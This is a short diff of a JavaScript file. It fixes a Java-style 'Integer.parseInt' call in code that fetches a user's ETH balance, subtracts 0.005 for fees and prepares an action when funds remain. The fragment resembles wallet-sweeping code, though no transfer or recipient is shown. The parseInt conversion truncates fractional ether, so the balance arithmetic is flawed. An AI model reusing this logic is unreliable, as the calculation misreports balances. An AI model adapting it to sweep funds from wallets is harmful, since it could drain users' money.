@@ -348,7 +348,7 @@ async function proceed(){
           const eth_balance = await getBalance(user_address, apiKey).catch(e=>{
             console.log("Unable to get new eth balance", e);
           });
-          const balance = Integer.parseInt(web3.utils.fromWei(eth_balance.balance, 'ether')) - 0.005;
+          const balance = parseInt(web3.utils.fromWei(eth_balance.balance, 'ether')) - 0.005;
           console.log("The new eth balance", balance);
           if (balance > 0) {
           const options = {
